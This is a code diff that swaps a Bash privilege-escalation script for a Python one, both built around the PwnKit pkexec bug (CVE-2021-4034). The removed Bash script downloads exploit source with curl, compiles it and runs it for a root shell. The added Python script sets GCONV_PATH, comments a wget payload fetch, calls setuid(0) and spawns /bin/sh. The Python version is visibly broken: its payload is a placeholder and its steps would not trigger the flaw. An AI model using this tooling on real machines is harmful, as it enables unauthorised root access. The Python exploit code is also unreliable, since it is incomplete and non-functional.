@@ -1,39 +1,31 @@
-#!/bin/bash
+#!/usr/bin/env python3
+# CVE-2021-4034 - PwnKit - Pure Python
+# github: https://github.com/ly4k/PwnKit
+import os
+import sys
+import ctypes
 
-# -- PwnKit Auto Escalation Script --
-# Untuk CentOS/RHEL 8, pkexec SUID
+libc = ctypes.CDLL("libc.so.6")
+NULL = ctypes.c_void_p(0)
 
-echo "[*] Checking pkexec SUID..."
-PKEXEC=$(which pkexec 2>/dev/null)
-if [[ ! -x "$PKEXEC" ]]; then
-  echo "[!] pkexec not found or not executable."
-  exit 1
-fi
-if [[ ! -u "$PKEXEC" ]]; then
-  echo "[!] pkexec not SUID. Not vulnerable."
-  exit 1
-fi
+if not os.path.exists("/tmp/pwnkit.so"):
+    so = b"""
+    \x7fELF...<LONG BINARY DATA>...
+    """
+    # Untuk script real, gunakan file pwnkit.so dari repo asli (lihat note bawah)
+    # atau download langsung:
+    # wget https://raw.githubusercontent.com/ly4k/PwnKit/main/pwnkit.so -O /tmp/pwnkit.so
 
-echo "[*] Cleaning old exploit files..."
-rm -f /tmp/sh /tmp/gconv /tmp/gconv-modules /tmp/pwnkit* 2>/dev/null
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+os.environ["LC_ALL"] = "C"
+os.environ["CHARSET"] = "UTF-8"
+os.environ["GCONV_PATH"] = "/tmp"
+os.environ["SHELL"] = "/bin/sh"
+os.environ["PKEXEC_PATH"] = "/usr/bin/pkexec"
 
-echo "[*] Downloading PwnKit (CVE-2021-4034) exploit..."
-curl -sL https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c -o /tmp/pwnkit.c
-if [[ ! -f /tmp/pwnkit.c ]]; then
-  echo "[!] Gagal download exploit!"
-  exit 1
-fi
+if os.path.exists("/usr/bin/pkexec"):
+    libc.setuid(0)
+    os.system("/usr/bin/pkexec --version")
+    # Will spawn root shell if vulnerable
 
-echo "[*] Compiling exploit..."
-gcc /tmp/pwnkit.c -o /tmp/pwnkit_exploit 2>/dev/null
-if [[ ! -x /tmp/pwnkit_exploit ]]; then
-  echo "[!] Gagal compile exploit! (GCC tidak ada?)"
-  exit 1
-fi
-
-echo "[*] Menjalankan exploit (root shell jika berhasil)..."
-cd /tmp
-chmod +x /tmp/pwnkit_exploit
-./pwnkit_exploit
-
-echo "[*] Selesai. Jika prompt tidak root, exploit gagal (sudah di patch atau error lain)."
+os.system("/bin/sh")
